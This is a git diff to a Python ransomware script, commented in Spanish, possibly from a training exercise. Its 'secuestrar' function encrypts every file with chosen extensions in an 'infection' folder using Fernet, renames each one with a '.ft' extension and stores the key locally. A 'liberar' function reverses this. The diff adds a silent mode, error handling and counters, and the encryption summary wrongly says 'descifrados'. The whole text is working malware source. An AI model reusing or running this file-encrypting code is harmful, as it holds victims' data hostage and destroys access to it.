@@ -94,8 +94,10 @@ def validar_fichero(elemento, modo):
                 return True
 
         else:
-            print("Error: modo inexistente de validación de fichero.")
-            print("Formatos aceptados: 'c' (cifrado) o 'd' (descifrado).")
+            if not silencio:
+                print("Error: modo inexistente de validación de fichero.")
+                print("Formatos aceptados: 'c' (cifrado) o 'd' (descifrado).")
+
             exit(1)
 
     return False
@@ -104,7 +106,8 @@ def validar_fichero(elemento, modo):
 # Cifra los archivos del directorio de este script que tenga alguna de las extensiones indicadas.
 # Una vez cifrados les añade la extensión '.ft' y los guarda en un directorio llamado 'infection'.
 def secuestrar():
-    ficheros = []
+    ficheros = []   # Ficheros a cifrar
+    exito = 0       # Ficheros cifrados
 
     # Obtener todos los elementos en el directorio de este script.
     for fichero in os.listdir(infectorio):
@@ -116,7 +119,7 @@ def secuestrar():
             ficheros.append(fichero)
 
     # Generar una clave de cifrado.
-    clave = Fernet.generate_key()
+    clave = Fernet.generate_key()   # Clave de más de 16 caracteres.
 
     # Escribir la clave en un fichero.
     with open("clave.key", "wb") as f:
@@ -124,31 +127,43 @@ def secuestrar():
 
     # Cifrar los ficheros obtenidos anteriormente.
     for fichero in ficheros:
-        # Extraer y cifrar el contenido del fichero.
-        with open(fichero, "rb") as f:
-            cifrado = Fernet(clave).encrypt(f.read())
+        try:
+            # Extraer y cifrar el contenido del fichero.
+            with open(fichero, "rb") as f:
+                cifrado = Fernet(clave).encrypt(f.read())
 
-        # Escribir el contenido cifrado del fichero.
-        with open(fichero, "wb") as f:
-            f.write(cifrado)
+            # Escribir el contenido cifrado del fichero.
+            with open(fichero, "wb") as f:
+                f.write(cifrado)
 
-        # Renombrar el fichero añadiendo la extensión.
-        os.rename(fichero, fichero + ".ft")
+            # Renombrar el fichero añadiendo la extensión.
+            os.rename(fichero, fichero + ".ft")
 
-    # Mostrar los ficheros afectados.
-    print("Se cifraron los archivos:")
+            # Contar el número de ficheros cifrados.
+            exito += 1
+
+        except Exception as e:
+            if not silencio:
+                print("Error: no se pudo cifrar el fichero '{}'.".format(fichero))
+
+    # Mostrar el resumen (si 'ficheros = []' al menos muestra '0/0').
     if not silencio:
-        for f in sorted(ficheros):
-            print(f)
+        print("\nArchivos cifrados:")
 
-    # Devuelve la cantidad de ficheros cifrados.
+        for f in sorted(ficheros):
+            print("\t{}".format(f))
+
+        print("\n\tResumen: {0}/{1} ficheros descifrados.".format(exito, len(ficheros)))
+
+    # Devuelve la cantidad de ficheros cifrados (no se usa).
     return len(ficheros)
 
 
 # Descifrar los archivos del directorio de este script que tengan
 # la extensión '.ft', salvo que su extensión original ya fuera '.ft'.
 def liberar(carpeta):
-    ficheros = []
+    ficheros = []   # Ficheros a descifrar
+    exito = 0       # Ficheros descifrados
 
     # Obtener todos los elementos en el directorio de este script.
     for elemento in os.listdir(infectorio):
@@ -159,20 +174,30 @@ def liberar(carpeta):
         if validar_fichero(elemento, "d"):
             ficheros.append(elemento)
 
+    # Mostrar los ficheros cifrados.
+    if not silencio and ficheros:
+        print("Archivos cifrados:")
+
+        for f in sorted(ficheros):
+            print("\t{}".format(f))
+
+        print("\n\tTotal: {}.\n".format(len(ficheros)))
+
+
     # Leer la clave de cifrado.
     with open("clave.key", "rb") as f:
         clave = f.read()
 
     # Descifrar los ficheros obtenidos anteriormente.
     for fichero in ficheros:
+        # Extraer el nombre del fichero de su ruta.
+        nombre = os.path.split(fichero)[1]
+
+        """
+        '[1]' porque devuelve una tupla '(path, file)' y solo quiero el nombre.
+        """
+
         try:
-            # Descomponer la ruta del fichero.
-            nombre = os.path.split(fichero)[1]
-
-            """
-            '[1]' porque devuelve una tupla '(path, file)' y solo quiero el nombre.
-            """
-
             # Extraer y descifrar el contenido del fichero.
             with open(fichero, "rb") as f:
                 descifrado = Fernet(clave).decrypt(f.read())
@@ -194,19 +219,28 @@ def liberar(carpeta):
                 # Renombrar el dichero cifrado
                 os.rename(fichero, fichero[:-3])
 
+            # Contar el número de ficheros descifrados.
+            exito += 1
+
             """
             '[:-3]' para el devolver el nombre hasta el '.ft' que mide 3 caracteres.
             """
 
-        # Si se intenta descifrar un fichero que no ha sido cifrado (es '.ft' sin extensión original).
-        except Exception as e:
-            # Extraer el fichero de la lista de ficheros descifrados.
-            ficheros.remove(fichero)
+        # Un fichero es '.ft' sin extensión original o el descifrado falla.
+        except Exception:
+            if not silencio:
+                print("Error: no se pudo descifrar el fichero '{}'.".format(nombre))
 
-    if not silencio and ficheros:
-        print("Ficheros:", sorted(ficheros))
+    # Mostrar el resumen (si 'ficheros = []' al menos muestra '0/0').
+    if not silencio:
+        print("\nArchivos descifrados:")
 
-    # Devuelve la cantidad de ficheros descifrados.
+        for f in sorted(ficheros):
+            print("\t{}".format(f))
+
+        print("\n\tResumen: {0}/{1} ficheros descifrados.".format(exito, len(ficheros)))
+
+    # Devuelve la cantidad de ficheros descifrados (no se usa).
     return len(ficheros)
 
 
@@ -223,14 +257,8 @@ if __name__ == "__main__":
 
     # Se solicitó descifrar los ficheros (-r).
     elif revertir:
-        contador = liberar(carpeta)
-
-        if not silencio:
-            print("Se descifraron {} ficheros.".format(contador))
+        liberar(carpeta)    # Se solicitó una 'carpeta' donde descifrar (-p).
 
     # Se solicitó cifrar los ficheros (ninguna opción).
     else:
-        contador = secuestrar()
-
-        if not silencio:
-            print("Se cifraron {} ficheros.".format(contador))
+        secuestrar()
